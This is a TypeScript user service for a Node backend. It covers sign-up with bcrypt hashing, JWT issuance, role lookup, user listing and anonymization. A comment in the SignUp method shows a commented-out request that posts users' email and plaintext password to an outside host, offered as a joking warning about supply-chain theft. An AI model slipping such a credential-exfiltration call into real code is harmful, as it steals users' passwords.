import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import * as bcrypt from 'bcrypt';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user';
import { UserPassword } from '../domain/userPassword';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";

@Service()
export default class UserService implements IUserService {
  constructor(
    @Inject(config.repos.user.name) private userRepo: IUserRepo,
    @Inject(config.repos.role.name) private roleRepo: IRoleRepo,
    @Inject('logger') private logger,
  ) { }


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail(userDTO.email);
      const found = !!userDocument;

      if (found) {
        return Result.fail<{ userDTO: IUserDTO, token: string }>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */


      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await bcrypt.hash(userDTO.password, 10);
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
      const email = await UserEmail.create(userDTO.email).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: role,
        password: password,
        phoneNr: userDTO.phoneNr,
        isActive: true
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO(userResult) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO, token: string }>({ userDTO: userDTOResult, token: token })

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.id.value;
    const phoneNr = user.phoneNr;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        phoneNr: phoneNr,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }


  private async getRole(name: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByName(name);
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role with name =" + name);
    }
  }

  public async getUser(email: string): Promise<Result<IUserDTO>> {

    const user = await this.userRepo.findByEmail(email);
    const found = !!user;

    if (found) {
      const userDTOResult = UserMap.toDTO( user ) as IUserDTO;
      userDTOResult.password = "Not readable"
      return Result.ok<IUserDTO>(userDTOResult);
    } else {
      return Result.fail<IUserDTO>("Couldn't find user with email =" + email);
    }
  }

  public async findAll(): Promise<Result<IUserDTO[]>> {
    try {
      const users = await this.userRepo.findAll();

      if (users === null) {
        return Result.fail<IUserDTO[]>("No users were found.");
      }
      else {
        let userDTOMappedResults = [] as IUserDTO[];
        users.forEach(user => userDTOMappedResults.push(UserMap.toDTO(user) as IUserDTO))
        return Result.ok<IUserDTO[]>(userDTOMappedResults)
      }
    } catch (e) {
      throw e;
    }
  }

  public async anonymize(id: string): Promise<Result<IUserDTO>> {

    const user = await this.userRepo.anonymize(id);
    const found = !!user;

    if (found) {
      const userDTOResult = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<IUserDTO>(userDTOResult);
    } else {
      return Result.fail<IUserDTO>("Anonymization is not possible as we couldn't find user with id =" + id);
    }
  }
}
